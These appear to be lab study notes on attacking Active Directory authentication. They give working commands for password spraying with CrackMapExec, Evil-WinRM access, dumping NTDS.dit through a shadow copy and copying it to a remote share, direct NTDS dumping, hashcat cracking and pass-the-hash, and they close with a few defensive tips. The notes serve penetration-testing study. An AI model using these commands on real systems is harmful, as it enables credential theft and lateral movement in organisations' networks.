

## Domain Authentication Basics

- Domain-joined systems use **Domain Controller (DC)** for authentication.
    
- Local logins still possible with:
    
    - `hostname\username`
        
    - `.\username`
        
- Key components:
    
    - `lsass.exe`
        
    - NTLM & Kerberos
        
    - Active Directory Domain Services
        

---

## Dictionary Attacks on AD

- Use **wordlists** of common usernames + passwords.
    
- Tools: **CrackMapExec (CME)**
    
- Common username formats:
    
    - `jdoe`
        
    - `janedoe`
        
    - `jane.doe`
        
    - `doe.jane`
        
- Generate usernames:
    
    ```
    ./username-anarchy -i names.txt
    ```
    
- Attack example:
    
    ```
    crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
    ```
    
- Results:
    
    - Success → CME shows valid login
        
    - Fail → STATUS_LOGON_FAILURE
        
- Risk: account lockouts (Event ID 4776 logged in Security Logs).
    

---

## NTDS.dit (AD Database)

- Location: `%SystemRoot%\NTDS\NTDS.dit`
    
- Contains all AD users, password hashes, schema info.
    

### Privileges Needed

- Local Admin or Domain Admin required to copy/dump.
    

### Access with Evil-WinRM

```
evil-winrm -i 10.129.201.57 -u bwilliamson -p 'P@55w0rd!'

net localgroup

net user bwilliamson

```

---

## Dumping NTDS.dit

### Method 1 – Shadow Copy

```
vssadmin CREATE SHADOW /For=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
```

### Method 2 – CrackMapExec (Direct Dump)

```
crackmapexec smb 10.129.201.57 -u bwilliamson -p 'P@55w0rd!' --ntds
```

---

## Cracking Extracted Hashes

**Hashcat NTLM mode (1000):**

```
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

Example:

```
64f12cddaa88057e06a81b54e73b949b:Password1
```

---

## Pass-the-Hash (PtH)

Use NTLM hash directly (no cracking required):

```
evil-winrm -i 10.129.201.57 -u Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```

- Useful for **lateral movement**.
    

---

## Key Defensive Notes

- Monitor for **Event ID 4776** (failed logons).
    
- Restrict **Domain Admin rights**.
    
- Monitor **shadow copy creation**.
    
- Enforce strong password policies and lockouts.
    